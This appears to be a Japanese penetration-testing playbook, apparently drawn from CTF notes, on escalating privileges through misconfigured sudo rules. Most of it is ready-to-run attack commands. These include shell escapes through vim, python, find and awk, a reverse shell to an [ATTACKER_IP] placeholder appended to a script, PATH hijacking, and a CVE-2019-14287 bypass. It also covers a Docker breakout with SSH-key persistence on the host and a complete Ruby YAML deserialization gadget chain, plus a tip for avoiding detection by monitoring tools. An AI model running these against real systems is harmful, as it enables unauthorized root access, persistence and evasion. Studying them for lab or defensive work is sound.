# sudo 設定不備による権限昇格

## 概要

`/etc/sudoers` の設定ミスにより、特定のコマンドをパスワードなしで root として実行できる場合がある。

---

## 着火条件

```bash
sudo -l
```

出力に `NOPASSWD` または特定コマンドへの許可が含まれている場合。

---

## 観点・着眼点（パターン全体）

**`sudo -l` の出力で何に気付くか：**

| `sudo -l` に見える要素 | 示唆 | 次のアクション |
|--------------------|-----|------------|
| `NOPASSWD:` | パスワード不要で sudo 実行可能 | 該当コマンドを GTFOBins で検索 |
| `(ALL : ALL)` / `(ALL)` | 任意ユーザーとして実行可 | そのまま `sudo -u root [CMD]` |
| `(root)` が明示 | root 権限で実行できる | 昇格経路として最優先 |
| コマンドの末尾が `*`（ワイルドカード） | 引数を自由に指定可能 | サブコマンドや `--config` などから escape を狙う |
| スクリプトパスが `/opt/` / `/home/` 配下 | 自作スクリプトの可能性 | 書き込み権限があれば内容を書き換えて悪用 |
| `env_keep+=LD_PRELOAD` | 環境変数を引き継ぐ | 共有ライブラリ注入（LD_PRELOAD 攻撃） |
| `sudo` のバージョンが 1.8.28 未満 | CVE-2019-14287（`!root` バイパス）候補 | `sudo -u#-1 [CMD]` を試す |
| `docker` / `docker exec` への許可 | コンテナブレイクアウト候補 | パターン4へ |

---

## 典型的な出力パターンと対応

### パターン1: 特定コマンドに NOPASSWD

```
(ALL) NOPASSWD: /usr/bin/vim
(ALL) NOPASSWD: /usr/bin/python3
(ALL) NOPASSWD: /usr/bin/find
```

→ GTFOBins で対象コマンドの「Sudo」セクションを確認

**悪用手順：**
```bash
# vim / nano / less
sudo vim -c ':!/bin/bash'

# python / python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# find
sudo find . -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'
```

**注意点・落とし穴：**
- 絶対パスが指定されている（`/usr/bin/vim`）場合、シンボリックリンクや PATH 経由での呼び出しは通らない。そのパスで呼ぶ
- バイナリが別の場所にも存在し、片方だけ許可されている場合がある。`which vim` で確認
- GTFOBins にない独自コマンドでも、内部で外部コマンドを呼んでいれば PATH ハイジャックで悪用できることがある
- エディタ系（`vim`, `nano`, `less`, `more`, `man`）は「編集機能から外部コマンド実行」が共通パターン

### パターン2: ALL コマンドを許可

```
(ALL) NOPASSWD: ALL
```

→ `sudo /bin/bash` で即座に root

**注意点・落とし穴：**
- これが見えた時点で即 root。他の探索に時間を使わない
- ただし `sudo -l` 実行自体にパスワードが必要なケースがある（`Defaults rootpw` 設定等）。現ユーザーのパスワードを取得してから再実行

### パターン3: 特定スクリプトの実行を許可

```
(ALL) NOPASSWD: /opt/scripts/backup.sh
```

**悪用手順：**
```bash
# スクリプトが書き込み可能な場合 → 直接書き換え
echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' >> /opt/scripts/backup.sh
sudo /opt/scripts/backup.sh

# スクリプトが書き込み不可 → スクリプト内から呼ばれる外部コマンドの PATH ハイジャック
# 1. スクリプトを cat で読む
cat /opt/scripts/backup.sh
# 2. フルパスなしで呼ばれているコマンド（例: tar, cp）を確認
# 3. /tmp/tar に偽バイナリを置いて PATH を先頭に注入
echo -e '#!/bin/bash\n/bin/bash' > /tmp/tar && chmod +x /tmp/tar
PATH=/tmp:$PATH sudo /opt/scripts/backup.sh
```

**注意点・落とし穴：**
- スクリプトが書き込み可能か確認: `ls -la /opt/scripts/backup.sh`
- 書き込み不可でも「親ディレクトリが書き込み可能」なら元ファイルを消して同名で作り直せる
- スクリプト内のフルパスなしコマンド（`tar`, `cp`, `date` 等）は PATH ハイジャック対象
- `sudo` は既定で `secure_path` を強制するため単純な PATH 汚染は効かないことが多い。`sudoers` に `env_reset` が無い / `secure_path` が定義されていない時のみ有効

---

## 悪用手順（共通テクニック）

### vim / nano / less

```bash
sudo vim -c ':!/bin/bash'
sudo vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```

### python / python3

```bash
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### find

```bash
sudo find . -exec /bin/bash \; -quit
```

### awk

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 任意スクリプトが書き込み可能な場合

```bash
# スクリプトにリバースシェルを追記
echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' >> /opt/scripts/backup.sh

# sudo で実行
sudo /opt/scripts/backup.sh
```

---

## 全パターン共通の注意点・落とし穴

- `sudo -l` でパスワードを求められる場合でも、現在のユーザーのパスワードが判明していれば入力できる
- `env_keep` の設定次第では環境変数（`LD_PRELOAD` 等）を引き継いで悪用できる
- sudoers の `!root` 指定（特定ユーザー以外として実行）は古い sudo でバイパスできる場合がある（CVE-2019-14287 → `sudo -u#-1 [CMD]`）
- `sudo -l` は「現在のセッション・ユーザー」に対してしか表示されない。su / ssh で別ユーザーになったら再実行する
- `tty_tickets` が有効だと tty ごとにパスワードキャッシュが分かれる。別シェルで通っても別 tty では通らない

---

## パターン4: docker exec へのワイルドカード NOPASSWD

### 着火条件
`sudo -l` の出力に以下のようなエントリがある場合：

```
(root) NOPASSWD: /snap/bin/docker exec *
(root) NOPASSWD: /usr/bin/docker exec *
```

ワイルドカード `*` により、`docker exec` のオプションを自由に指定できる。

### 観点・着眼点
`docker exec` は実行中コンテナにプロセスを起動する。`--user root` フラグを付けることで、コンテナ内で root として実行できる。さらに、コンテナがホストのブロックデバイス（`/dev/sda1` 等）にアクセスできる場合はホストのファイルシステム全体をマウントして読み書きが可能。

**コンテナIDを特定する方法：**
- `cat /etc/hosts`（コンテナ内からアクセスできている場合）→ ホスト名が16進文字列
- パストラバーサル等で `/etc/hosts` を読み取った場合も同様

### 手順

**ステップ1: コンテナIDの特定**
```bash
# /etc/hosts の確認（コンテナ内でのホスト名 = コンテナID）
# パストラバーサルで読み取った場合も同様
# 出力例: 172.17.0.2   e6ff5b1cbc85
```

**ステップ2: コンテナ内で root として実行できるか確認**
```bash
sudo /snap/bin/docker exec --user root [CONTAINER_ID] id
# uid=0(root) gid=0(root) groups=0(root),...
```

**ステップ3a: コンテナ内でシェルを取得**
```bash
sudo /snap/bin/docker exec --user root [CONTAINER_ID] /bin/sh
# または
sudo /snap/bin/docker exec -it --user root [CONTAINER_ID] /bin/bash
```

**ステップ3b: ホストのブロックデバイスをマウント（Docker ブレイクアウト）**

コンテナが privileged モードで動作しているか、ホストのデバイスにアクセスできる場合：

```bash
# ブロックデバイスの確認
sudo /snap/bin/docker exec --user root [CONTAINER_ID] ls /dev/sd*

# ホストのルートパーティションをマウント
sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
  sh -c 'mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host'

# ホストのファイルを読み取る
sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
  sh -c 'cat /mnt/host/root/root.txt'

# ホストに root SSH 公開鍵を書き込む（永続化）
sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
  sh -c 'echo "ssh-rsa [YOUR_PUBKEY]" >> /mnt/host/root/.ssh/authorized_keys'
```

### 注意点・落とし穴
- コンテナが通常モード（non-privileged）でも `/dev/sda*` が見えることがある。見えたらマウントを試みる
- `-it` フラグ（インタラクティブ + TTY）は TTY を確保するが、環境によっては動作しない。その場合は `-i` のみ、または `sh -c '[COMMAND]'` を使う
- マウント後のパスはコンテナ内のパス。ホストの `/root/root.txt` は `/mnt/host/root/root.txt` でアクセス
- ホストのファイルシステムへの書き込みも可能なため、SSH 鍵の埋め込みや `/etc/passwd` の書き換えも実施できる
- `/dev/sda1` が見つからない場合は `lsblk` で確認。`vda1`・`nvme0n1p1` 等、環境によってデバイス名が異なる

> **なぜコンテナ内からホストのブロックデバイスが見えるのか** — Docker の namespace 分離の仕組み・`/dev/sda1` の命名規則・capability との関係を理解したい場合は `../06_Concepts/Docker_Isolation.md` を参照。

---

---

## パターン5: スクリプトが YAML.load / pickle.load 等でユーザー書き込み可能なファイルを読み込む場合

### 着火条件

`sudo -l` の出力に以下のようなエントリがある場合：

```
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
(root) NOPASSWD: /usr/bin/python3 /opt/restore.py
```

スクリプトを `cat` で確認した際に以下のいずれかが見つかる場合：
- `YAML.load(File.read(...))` — Ruby の安全でない YAML 読み込み
- `pickle.load(open(...))` — Python のオブジェクトデシリアライゼーション
- 読み込み先ファイルが**現ユーザーが書き込めるパスにある**（例: カレントディレクトリ、`/home/[USER]/`）

### 観点・着眼点

**「何が出たら次に何をするか」：**

| スクリプトの中身 | 意味 | 次のアクション |
|----------------|------|-------------|
| `YAML.load(File.read("dependencies.yml"))` （相対パス） | カレントディレクトリのファイルを読む。書き込み可能ディレクトリで sudo を実行すれば任意YAMLを読ませられる | 自分が書けるディレクトリに移動 → 悪意ある `dependencies.yml` を作成 → sudo 実行 |
| `YAML.load(File.read("/home/henry/deps.yml"))` （絶対パス かつ 自分のホームディレクトリ） | ホームディレクトリは通常書き込み可能 | 同上 |
| `YAML.safe_load(...)` | 安全なロード。任意オブジェクトのデシリアライズは不可 | このパターンは使えない。スクリプトの他の箇所を確認 |
| `pickle.load(open("backup.pkl", "rb"))` | Python の pickle デシリアライゼーション。任意コード実行可能 | pickle ファイルを偽装して配置 |

**YAML.load の危険性：** Ruby の `YAML.load` (Psych ライブラリ) は `!ruby/object:ClassName` タグを使うことで**任意の Ruby オブジェクトをインスタンス化**できる。これを連鎖させる（Gadget Chain）ことで、最終的に `Kernel#system` を呼ばせられる。

> 原理（なぜ YAML.load でコードが実行されるか・Gadget Chain の動作ステップ） → `../06_Concepts/YAML_Deserialization.md`

### 手順

#### Step 1: スクリプトの内容と読み込みパスを確認

```bash
# [Target] sudo で実行されるスクリプトを確認
cat /opt/update_dependencies.rb
```

確認ポイント：
- `YAML.load` と `YAML.safe_load` のどちらを使っているか
- 読み込むファイルのパスが相対パス（`"dependencies.yml"`）か絶対パスか
- 絶対パスの場合、そのファイルが自分のホームディレクトリなど書き込み可能な場所にあるか

#### Step 2: 悪意ある YAML ファイルを書き込み可能なディレクトリに作成

**事前準備（必須）：** スクリプトを実行するディレクトリ（相対パスの場合はカレントディレクトリが読み込み先になる）に `dependencies.yml` を配置する。

```bash
# [Target] ファイルを書き込み可能なディレクトリに移動
cd /home/henry

# cat << 'EOF' > で YAML ファイルを作成
# ポイント: 'EOF' をシングルクォートで囲むと、ヒアドキュメント内の
#   !や$等の特殊文字がシェルに解釈されない（バックスラッシュエスケープ不要）
cat << 'EOF' > dependencies.yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: x
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/object:Gem::Installer
                     i: x
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
EOF
```

**`git_set:` の値が実行されるコマンド。** `chmod +s /bin/bash` の代わりに以下も使える：
```
git_set: "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
git_set: "echo 'henry ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
```

#### Step 3: sudo でスクリプトを実行

```bash
# [Target] sudo 実行（エラーが出ても途中でコマンドが走る）
sudo /usr/bin/ruby /opt/update_dependencies.rb
# エラー例: undefined method `map' for nil:NilClass (NoMethodError)
# → エラーが出ても SUID が設定されていることがある
```

#### Step 4: SUID が設定されたことを確認してシェルを取得

```bash
# [Target] SUID が設定されているか確認
ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash  ← s が付いていれば成功

# bash -p で EUID=root として実行（-p は実効 UID を落とさずに起動するオプション）
/bin/bash -p

# 確認
id
# uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root)
```

#### Step 5（原状回復）

```bash
# SUID を元に戻す（本番環境・実環境では必須）
chmod -s /bin/bash

# 作成した YAML ファイルを削除
rm /home/henry/dependencies.yml
```

### 刺さらなかったとき

- `YAML.safe_load` が使われている → このガジェットチェーンは使えない。スクリプトの他の脆弱性（外部コマンドの PATH ハイジャック等）を探す
- エラーなしで正常終了するが SUID が設定されない → YAML の構造が崩れている。インデントが 2 スペース単位であることを確認する（YAML はインデント厳格）
- `ruby 3.1` 以降 → Psych 4.0 に更新されデフォルトで `safe_load` 相当になっているため、このガジェットチェーンは動作しない（`YAML.unsafe_load` に明示変更しない限り）
- `cat << 'EOF' >` でファイルを作ってもインデントが崩れる → `printf` / `python3 -c "print(...)"` / `vi` 等で直接作成する

### 注意点・落とし穴

- **YAML のインデントは 2 スペース厳守。** タブ文字が混入するとパース失敗。`cat -A dependencies.yml` で `^I`（タブ）がないことを確認する
- `cat << 'EOF' >` はシングルクォート付き `'EOF'` であることが重要。ダブルクォート `"EOF"` や引用符なし `EOF` だとヒアドキュメント内の `!` や `$` がシェルに解釈される
- `chmod +s /bin/bash` 後に bash を通常実行（`/bin/bash`）すると SUID が落とされる。必ず `-p` オプションを付ける
- sudo 実行後にエラーが出ても、YAML の途中まで処理されてコマンドが走っていることがある。エラーを見て諦めず `ls -la /bin/bash` で確認する
- **原状回復必須：** `chmod -s /bin/bash` で SUID を必ず元に戻す。実環境で SUID を残したままにすると、後からシステムを監視しているツールに検知される

### 関連技術
- 前：sudo -l でスクリプトパスを発見 → このファイルの観点・着眼点（パターン全体）
- 後：bash -p での root シェル取得 → `Enumeration_Checklist.md`（侵入後列挙）
- YAML.load が任意コード実行できる原理 → `../06_Concepts/YAML_Deserialization.md`
- `.bundle/config` 等からの認証情報取得（横移動に必要） → `../02_Initial_Access/Credential_Discovery.md`

---

## 関連技術
- 前：GTFOBins: https://gtfobins.github.io/
- 後：その他の昇格手法 → `Capabilities.md`, `SUID_SGID.md`
- パストラバーサルでコンテナIDを特定 → `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`
- Docker 分離の原理（なぜ効くか） → `../06_Concepts/Docker_Isolation.md`
